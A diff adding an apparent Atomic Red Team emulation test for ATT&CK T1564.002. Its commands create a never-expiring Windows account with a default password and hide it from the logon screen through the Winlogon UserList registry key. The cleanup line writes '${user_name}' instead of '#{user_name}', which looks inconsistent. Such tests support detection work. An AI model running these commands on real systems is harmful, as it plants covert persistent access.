@@ -37,3 +37,28 @@ atomic_tests:
       sudo dscl . -delete /Users/#{user_name}
     elevation_required: true
     name: sh
+- name: Create Hidden User in Registry
+  auto_generated_guid: 173126b7-afe4-45eb-8680-fa9f6400431c
+  description: |
+    Adversaries may similarly hide user accounts in Windows. Adversaries can set the HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList Registry key value to 0 for a specific user to prevent that user from being listed on the logon screen.
+    Reference https://attack.mitre.org/techniques/T1564/002/ and https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/
+  supported_platforms:
+  - windows
+  input_arguments:
+    user_password:
+      description: Password for new user account
+      type: String
+      default: At0micRedTeam!
+    user_name:
+      description: Username
+      type: String
+      default: AtomicOperator
+  executor:
+    command: |
+      NET USER #{user_name}$ #{user_password} /ADD /expires:never 
+      REG ADD "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v #{user_name}$ /t REG_DWORD /d 0
+    cleanup_command: |
+      reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v #{user_name}$ /f >nul 2>&1
+      net user ${user_name}$ /delete >nul 2>&1
+    name: command_prompt
+    elevation_required: true
